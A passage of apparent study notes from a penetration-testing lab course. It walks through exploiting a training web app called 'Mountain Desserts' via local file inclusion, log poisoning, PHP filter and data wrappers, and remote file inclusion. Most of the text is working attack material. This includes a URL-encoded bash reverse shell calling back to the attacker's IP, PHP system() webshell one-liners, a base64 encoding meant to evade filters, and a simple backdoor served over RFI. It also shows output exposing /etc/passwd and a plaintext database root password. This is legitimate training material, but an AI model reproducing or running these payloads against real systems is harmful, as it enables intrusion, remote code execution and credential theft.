192.168.45.198 - - [27/Aug/2023:16:57:05 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2132 "http://mountaindesserts.com/meteor/index.php" "    PID TTY          TIME CMD
     37 ?        00:00:00 apache2
     38 ?        00:00:00 apache2
     39 ?        00:00:00 apache2
     40 ?        00:00:00 apache2
     41 ?        00:00:00 apache2
     47 ?        00:00:00 apache2
     49 ?        00:00:00 apache2
     50 ?        00:00:00 apache2
     51 ?        00:00:00 apache2
     52 ?        00:00:00 apache2
     53 ?        00:00:00 sh
     54 ?        00:00:00 ps
     54 ?        00:00:00 ps"

    <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.2.min.js"><\/script>')</script>
...

### Spawn netcat reverse shell

$ nc -nvlp 4444

### Spawn reverse shell (enclosing single quotes of URL encode important)

GET /meteor/index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.198%2F4444%200%3E%261%22 HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

┌──(kali㉿kali)-[~]
└─$ sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.246.16] 36958
bash: cannot set terminal process group (35): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2ebe30ebb935:/var/www/html/meteor$ whoami
whoami
www-data
www-data@2ebe30ebb935:/var/www/html/meteor$ sudo -l
sudo -l
Matching Defaults entries for www-data on 2ebe30ebb935:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 2ebe30ebb935:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
www-data@2ebe30ebb935:/var/www/html/meteor$ 

### -------------------- FLAG -------------------- #

www-data@2ebe30ebb935:/var/www/html/meteor$ sudo cat /home/ariella/flag.txt
sudo cat /home/ariella/flag.txt
OS{965fc8eb26256c952045acd438d25619}
```

Exploit the LFI vulnerability in the web application "Mountain Desserts" on WEB18 (VM #2) (located at http://mountaindesserts.com/meteor/) to execute the PHP /opt/admin.bak.php file with Burp or curl. Enter the flag from the output.

- DT with explicit path/rel path below.

```
### Exp

GET /meteor/index.php?page=/opt/admin.bak.php HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

### Rel w/url encoding

GET /meteor/index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fadmin.bak.php HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

...
<body>
        This script serves as backup for the old admin.php. The new website is still under development.. As long as it is not finished and deployed, we keep this hereIf you need this backup script just shoot me an email. The password for the backups is always OS{922a8fe91bf3c9e1718791cac49bc89a}

</body>
</html>
...
```

The "Mountain Desserts" web application now runs on VM #3 at http://192.168.50.193/meteor/ (The third octet of the IP address in the URL needs to be adjusted). Use the LFI vulnerability in combination with Log Poisoning to execute the dir command. Poison the access.log log in the XAMPP C:\\xampp\\apache\\logs log directory . Find the flag in one of the files from the dir command output.

- Target Xamp stack Win server.
    - Log path 'C:\\xampp\\apache\\logs\\access.log'.
    - Request sent to Burp.
        - Performed DT shown below, UA string written to Apache access log.
        - Prepare to inject PHP on-liner `<?php echo system($_GET['cmd']); ?>` in UA header.

```
### Check access.log 

┌──(kali㉿kali)-[~]
└─$ urlencode 'C:\xampp\apache\logs\access.log'
C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log

GET /meteor/index.php?page=C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

### After log poisoning, check with 'dir'

GET /meteor/index.php?page=C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log&cmd=dir HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

...
192.168.45.198 - - [27/Aug/2023:11:07:10 -0700] "GET /meteor/index.php?page=C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log HTTP/1.1" 200 27273 "http://mountaindesserts.com/meteor/" " Volume in drive C has no label.
 Volume Serial Number is 84F6-D600

 Directory of C:\xampp\htdocs\meteor

05/03/2022  11:08 AM    <DIR>          .
05/03/2022  10:55 AM    <DIR>          ..
05/03/2022  10:55 AM               453 ABOUT THIS TEMPLATE.txt
05/03/2022  10:55 AM               621 admin.php
05/03/2022  10:55 AM    <DIR>          css
05/03/2022  10:55 AM               265 docker-compose.yml
05/03/2022  10:55 AM               411 Dockerfile
05/03/2022  10:55 AM    <DIR>          fonts
08/27/2023  10:41 AM                38 hopefullynobodyfindsthisfilebecauseitssupersecret.txt
05/03/2022  10:55 AM    <DIR>          img
05/03/2022  10:55 AM             7,129 index.php
05/03/2022  10:55 AM    <DIR>          js
05/03/2022  10:55 AM            72,940 php.ini
05/03/2022  10:55 AM                61 start.sh
               8 File(s)         81,918 bytes
               6 Dir(s)   5,956,108,288 bytes free
               6 Dir(s)   5,956,108,288 bytes free text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
192.168.45.198 - - [27/Aug/2023:11:07:28 -0700] "GET /meteor/index.php?page=C%3A%5Cxampp%5Capache%5Clogs%5Caccess.log&cmd=ps HTTP/1.1" 200 27589 "http://mountaindesserts.com/meteor/" "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"

    <script>
...

### view secret, kill confirmed

GET /meteor/index.php?page=hopefullynobodyfindsthisfilebecauseitssupersecret.txt HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

...
</a>
OS{14b069b2a4b837e64c31d95d1da76910}

    <script>
...

```

#### PHP Wrappers

- PHP wrappers enhance the lang capability.
- Can be used to represent local or remote fs.
- Can use wrappers to bypass filters or obtain code exec.
- [many available](https://www.php.net/manual/en/wrappers.php)
    - We will look at;
        - `php://filter`
            - Display contents of files with or without encoding, ROT13 or Base64.
            - Can display content of exec PHP files instead of exec them.
            - Provides INT on potentially sensitive info.
        - `data://`
            - Can achieve code execution.
            - Utilize same PHP snips as used in log poisoning.

**filter example**

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

Note, body is not closed!!! We can assume exec code, such as php, follows.

Include with filter.

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <span style="color:#F00;text-align:center;">The admin page is currently under maintenance.
```

Same result as PHP is still executing, encode to base64 string to extract.

```bash
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K
...
```

Copy string from output and decode in terminal.

```bash
kali@kali:~$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);
...
```

Decoded data contains MySQL conn info!!!

**data example**

```bash
kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
...
```

PHP snip with data wrapper shows output of `ls`.

When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.

```bash
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==


kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
admin.php
bavarian.php
css
fonts
img
index.php
js
start.sh
...
```

Listing 25 shows that we successfully achieved code execution with the base64-encoded PHP snippet. This is a handy technique that may help us bypass basic filters. However, we need to be aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the [allow\_url\_include](https://www.php.net/manual/en/filesystem.configuration.php) setting needs to be enabled.

#### PHP Wrapper Exercises

Exploit the Local File Inclusion vulnerability on WEB18 (VM #1) by using the php://filter with base64 encoding to include the contents of the /var/www/html/backup.php file with Burp or curl. Copy the output, decode it, and find the flag.

```
### Test filter and base64 encode on admin.php

GET /meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

### Decode base64 encoded string, look at all the good loot!!!

┌──(kali㉿kali)-[~]
└─$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php
$servername = "localhost";
$username = "root";
$password = "M00nK4keCard!2#";

// Create connection
$conn = new mysqli($servername, $username, $password);

// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
echo "Connected successfully";
?>

</body>
</html>

### Go after the target file /var/www/html/backup.php

GET /meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

┌──(kali㉿kali)-[~]
└─$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAoKc3lzdGVtKCJzdWRvIHJzeW5jIC1hdnpSIC92YXIvd3d3L2h0bWwvaW5kZXgucGhwIC9tbnQvZXh0ZXJuYWwvIik7Ci8vIFNpbmNlIGl0IGlzIGEgUEhQIGZpbGUgdmlzaXRvcnMgY2Fubm90IHNlZSB0aGlzIGNvbW1lbnQuIFdlIG5lZWQgdG8gZXh0ZW5kIHRoaXMgc2NyaXB0IHRoYXQgaXQgYmFja3VwcyB0aGUgd2hvbGUgc3lzdGVtIGJ1dCBub3cgYXMgYSBQb0MgaXQgb25seSBiYWNrdXBzIGluZGV4LnBocAovL0BBbGw6IFdoZW4geW91IHJ1biB0aGUgYmFja3VwIHNjcmlwdCB5b3UgbmVlZCB0byBlbnRlciB0aGUgcGFzc3dvcmQgT1N7ZDg4YjQ2NGJkYzcwNjExNTZjNjliNTAwOTQ2YzM0MmV9LgoKPz4KCjwvYm9keT4KPC9odG1sPgo=" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php

system("sudo rsync -avzR /var/www/html/index.php /mnt/external/");
// Since it is a PHP file visitors cannot see this comment. We need to extend this script that it backups the whole system but now as a PoC it only backups index.php
//@All: When you run the backup script you need to enter the password OS{d88b464bdc7061156c69b500946c342e}.

?>

</body>
</html>


### If exp path had failed and we needed url encoding

┌──(kali㉿kali)-[~]
└─$ urlencode '../../../../../../../../var/www/html/backup.php'
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fbackup.php


GET /meteor/index.php?page=php://filter/convert.base64-encode/resource=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fbackup.php HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ echo "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAoKc3lzdGVtKCJzdWRvIHJzeW5jIC1hdnpSIC92YXIvd3d3L2h0bWwvaW5kZXgucGhwIC9tbnQvZXh0ZXJuYWwvIik7Ci8vIFNpbmNlIGl0IGlzIGEgUEhQIGZpbGUgdmlzaXRvcnMgY2Fubm90IHNlZSB0aGlzIGNvbW1lbnQuIFdlIG5lZWQgdG8gZXh0ZW5kIHRoaXMgc2NyaXB0IHRoYXQgaXQgYmFja3VwcyB0aGUgd2hvbGUgc3lzdGVtIGJ1dCBub3cgYXMgYSBQb0MgaXQgb25seSBiYWNrdXBzIGluZGV4LnBocAovL0BBbGw6IFdoZW4geW91IHJ1biB0aGUgYmFja3VwIHNjcmlwdCB5b3UgbmVlZCB0byBlbnRlciB0aGUgcGFzc3dvcmQgT1N7ZDg4YjQ2NGJkYzcwNjExNTZjNjliNTAwOTQ2YzM0MmV9LgoKPz4KCjwvYm9keT4KPC9odG1sPgo=" | base64 -d
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance</title>
</head>
<body>
        <?php echo '<span style="color:#F00;text-align:center;">The admin page is currently under maintenance.'; ?>

<?php

system("sudo rsync -avzR /var/www/html/index.php /mnt/external/");
// Since it is a PHP file visitors cannot see this comment. We need to extend this script that it backups the whole system but now as a PoC it only backups index.php
//@All: When you run the backup script you need to enter the password OS{d88b464bdc7061156c69b500946c342e}.

?>

</body>
</html>

```

Follow the steps above and use the data:// PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to execute the uname -a command on WEB18 (VM #1). Enter the Linux kernel version as answer.

```http
GET /meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?> HTTP/1.1
Host: mountaindesserts.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://mountaindesserts.com/meteor/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
Linux 3b51a43fad24 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 GNU/Linux
Linux 3b51a43fad24 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64 GNU/Linux
    <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.11.2.min.js"><\/script>')</script>
...

### Kernel version

5.4.0-132-generic

```

#### Remote File Inclusion (RFI)

- Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the target system must be configured in a specific way. In PHP web applications, for example, the allow\_url\_include option needs to be enabled to leverage RFI, just as with the data:// wrapper from the previous section.
    - Disabled by default.
- Allow us to include remote files over HTTP or SMB.
    - Also exec in context of web app.
- Discover using same techniques as DT and LFI.

**WebShells**

- Kali includes many `/usr/share/webshells/php/` that can be used for RFI.
    - We will use `simple-backdoor.php`
        - Similar to snippet in last section, it accepts `cmd` param.

```bash
kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
...
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
...
```

To leverage an RFI vulnerability, we need to make the remote file accessible by the target system.

```bash
kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

We could also use a publicly-accessible file, such as one from Github.

Next, we'll use curl to include the hosted file via HTTP and specify ls as our command.

```bash
kali@kali:/usr/share/webshells/php/$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 

<pre>admin.php
bavarian.php
css
fonts
img
index.php
js
</pre> 
```

#### Remote File Inclusion (RFI) Exercises

Follow the steps from this section to leverage RFI to remotely include the /usr/share/webshells/php/simple-backdoor.php PHP file. Use the "cmd" parameter to execute commands on VM #1 and use the cat command to view the contents of the authorized_keys file in the /home/elaine/.ssh/ directory. The file contains one entry including a restriction for allowed commands. Find the flag specified as the value to the command parameter in this file.

```bash
└─$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&cmd=ls"

...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>admin.php
bavarian.php
css
fonts
img
index.php
js
</pre> 
...

┌──(kali㉿kali)-[~]
└─$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&cmd=cat%20..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"

...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:106::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
elaine:x:1000:1000::/home/elaine:/bin/bash
</pre> 
...

┌──(kali㉿kali)-[~]
└─$ urlencode "cat ../../../../../../../home/elaine/.ssh/authorized_keys"
cat%20..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Felaine%2F.ssh%2Fauthorized_keys

┌──(kali㉿kali)-[~]
└─$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&cmd=cat%20..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Felaine%2F.ssh%2Fauthorized_keys"

...
<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

